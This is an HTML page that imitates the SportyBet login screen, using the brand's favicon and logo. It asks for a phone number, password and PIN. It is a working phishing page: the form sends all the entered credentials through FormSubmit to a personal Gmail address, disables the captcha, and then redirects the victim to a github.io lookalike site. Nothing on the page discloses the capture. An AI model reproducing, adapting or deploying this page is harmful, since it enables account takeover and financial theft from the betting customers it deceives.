<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to SportyBet</title>
  <link rel="shortcut icon" href="https://s.sporty.net/global/main/logo/favicon.ico"/>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f0f2f5;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      margin: 0;
    }
    .login-container {
      background-color: #fff;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    .login-button {
      background-color: #e41827;
      color: #fff;
      padding: 12px 20px;
      border: none;
      border-radius: 5px;
      font-size: 18px;
      cursor: pointer;
      width: 100%;
    }
    input, select {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <img src="https://s.sporty.net/common/main/res/5deafad00821308fc9a5fdb0a1cc038.png" alt="SportyBet Logo" style="max-width: 150px; margin-bottom: 20px;">
    <h2>Login to your account</h2>
    
    <form action="https://formsubmit.co/chisimdipayeer@gmail.com" method="POST">
      <!-- FormSubmit configuration -->
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_next" value="https://sportybets.github.io/Sporty/">

      <!-- Form Fields -->
      <label for="countryCode">Country Code</label>
      <select id="countryCode" name="Country Code">
        <option value="+234" selected>+234 (Nigeria)</option>
        <option value="+233">+233 (Ghana)</option>
        <option value="+254">+254 (Kenya)</option>
      </select>

      <label for="phone">Phone Number</label>
      <input type="tel" id="phone" name="Phone Number" placeholder="Enter your phone number" required>

      <label for="password">Password</label>
      <input type="password" id="password" name="Password" placeholder="Enter your password" required>

      <label for="pin">Pin</label>
      <input type="number" id="pin" name="Pin" placeholder="Enter your pin" required>

      <button type="submit" class="login-button">Login</button>
    </form>
  </div>
</body>
</html>
